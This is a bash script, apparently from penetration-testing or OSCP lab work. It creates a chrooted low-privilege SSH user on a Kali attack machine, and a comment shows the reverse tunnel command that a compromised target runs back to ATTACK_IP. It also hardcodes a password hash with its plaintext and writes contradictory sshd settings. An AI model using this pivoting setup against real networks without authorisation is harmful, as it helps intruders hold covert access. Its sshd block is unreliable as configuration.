#!/bin/bash
#add user to kali box with limited shell. Used for Remote tunneling
#Upload Private Key to target
#From target:
#ssh -i [/PATH/TO/KEY] user@[ATTACK_IP] -fNR [PORT]:127.0.0.1:[PORT]
mkdir /home/chroot
mkdir -p /home/chroot/dev/
cd /home/chroot/dev/
mknod -m 666 null c 1 3
mknod -m 666 tty c 5 0
mknod -m 666 zero c 1 5
mknod -m 666 random c 1 8

chown root:root /home/chroot
chmod 0755 /home/chroot

mkdir -p /home/chroot/bin
cp -v /bin/sh /home/chroot/bin/
ldd /bin/sh
mkdir /home/chroot/lib
mkdir /home/chroot/lib64
for i in $(ldd /bin/sh | egrep -o "\/lib\/.*\(" | cut -d " " -f 1); do cp -v $i /home/chroot/lib/; done
for i in $(ldd /usr/bin/mkdir | egrep -o "\/lib\/.*\(" | cut -d " " -f 1); do cp -v $i /home/chroot/lib/; done
for i in $(ldd /bin/sh | egrep -o "\/lib64\/.*\(" | cut -d " " -f 1); do cp -v $i /home/chroot/lib64/; done

mkdir /home/chroot/etc 

useradd user -s /bin/sh
#Example with 'P@$$w0rd123!!!' in file.txt                                                                            
#cat ~/file.txt | openssl passwd -1 -stdin                                                                            
echo 'user:$1$2gX9q2iE$8VLLFzFc7MkSooH/aRz.9.' | chpasswd -e                                                          
cp -vf /etc/{passwd,group} /home/chroot/etc/   

mkdir -p /home/chroot/home/user/.ssh                                                                                  
ssh-keygen -t rsa -f /home/chroot/id_rsa -q -N ''                                                                     
chown kali:kali /home/chroot/id_rsa                                                                                   
sed -i 's/kali@oscp//g' /home/chroot/id_rsa.pub                                                                       
cat /home/chroot/id_rsa.pub >> /home/chroot/home/user/.ssh/authorized_keys       

cat >> /etc/ssh/sshd_config <<EOF
Match User user
  AuthorizedKeysFile /home/chroot/home/user/.ssh/authorized_keys
  PubkeyAuthentication no #
  AuthenticationMethods publickey
  ChrootDirectory /home/chroot
EOF

systemctl restart ssh

cp /usr/bin/mkdir /home/chroot/bin/
cp /usr/bin/cat /home/chroot/bin/

chown -R user:user /home/chroot/home/user
#chmod -R 0700 /home/chroot/home/user
